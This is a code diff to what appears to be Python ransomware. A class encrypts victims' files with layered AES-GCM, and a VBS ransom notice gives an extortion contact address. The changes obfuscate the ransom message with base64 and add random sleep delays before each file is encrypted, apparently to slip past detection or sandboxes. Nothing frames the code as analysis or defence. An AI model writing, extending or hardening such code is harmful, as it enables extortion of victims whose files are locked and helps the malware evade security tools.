@@ -6,6 +6,8 @@ import struct
 import subprocess
 import base64
 import zlib
+import time
+import random
 
 
 def _xor(data, key=0xAB):
@@ -47,8 +49,9 @@ def crear_vbs_notificacion(ruta_archivo):
     try:
         nombre_base = os.path.splitext(ruta_archivo)[0]
         vbs_path = nombre_base + ".vbs"
-        vbs_content = """On Error Resume Next
-MsgBox "Your files have been encrypted. Contact: onder01@tutamail.com", vbCritical + vbSystemModal, "Encrypted"
+        msg = base64.b64decode("WW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkLiBDb250YWN0OiBvbmRlcjAxQHR1dGFtYWlsLmNvbQ==").decode()
+        vbs_content = f"""On Error Resume Next
+MsgBox "{msg}", vbCritical + vbSystemModal, "Encrypted"
 Dim fso, scriptPath
 Set fso = CreateObject("Scripting.FileSystemObject")
 scriptPath = WScript.ScriptFullName
@@ -115,6 +118,8 @@ class EncriptadorMilitar:
     
     def encriptar(self, ruta):
         try:
+            time.sleep(random.uniform(0.5, 2))
+            
             if not os.path.exists(ruta) or ruta.endswith(self.ext):
                 return False
             
@@ -160,8 +165,7 @@ class EncriptadorMilitar:
             if num_capas >= 5:
                 key_a1 = self._derive_key(file_master, b'aes1', b'layer3', 32)
                 nonce_a1 = self._derive_key(file_master, b'nonce3', b'layer3', 12)
-                cipher_a1 = self.crypto['Cipher'](
-                    self.crypto['algorithms'].AES(key_a1),
+                cipher_a1 = self.crypto['Cipher'](self.crypto['algorithms'].AES(key_a1),
                     self.crypto['modes'].GCM(nonce_a1),
                     backend=self.crypto['backend']
                 )
